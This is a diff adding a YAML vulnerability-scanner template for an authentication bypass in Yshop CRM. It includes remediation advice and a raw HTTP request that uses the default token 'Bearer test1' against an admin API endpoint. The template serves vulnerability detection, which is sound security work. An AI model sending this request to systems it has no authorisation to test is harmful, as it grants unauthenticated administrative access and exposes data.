@@ -1,0 +1,53 @@
+id: yshop-crm-default-token
+
+info:
+  name: Yshop CRM Default Authorization Token Authentication Bypass
+  author: qwtd
+  severity: high
+  description: |
+    Yshop CRM contains an authentication bypass vulnerability caused by
+    improper validation of the Authorization header. An attacker can
+    supply a default token value such as `Bearer test1` to access
+    protected backend API endpoints without valid credentials.
+  impact: |
+    Successful exploitation allows unauthenticated attackers to access
+    administrative API endpoints and perform actions with authenticated
+    user privileges. Depending on the deployed permissions, this may
+    result in sensitive information disclosure, unauthorized operations,
+    and complete compromise of the management system.
+  remediation: |
+    Implement proper token validation and signature verification.
+    Reject default, hardcoded, or arbitrary Authorization values.
+    Ensure all protected endpoints validate token authenticity,
+    expiration, and user identity before granting access.
+  classification:
+    cwe-id: CWE-287
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:L
+    cvss-score: 9.1
+  metadata:
+    vendor: Yshop
+    product: CRM
+    verified: true
+  tags: YSHOP商城后台管理系统
+
+http:
+  - raw:
+      - |
+        GET /admin-api/system/notify-message/get-unread-count HTTP/1.1
+        Host: {{Hostname}}
+        Accept: application/json, text/plain, */*
+        Accept-Language: zh-CN,zh;q=0.9
+        Authorization: Bearer test1
+        Connection: close
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "code"
+          - "data"
+          - "msg"
+        condition: and
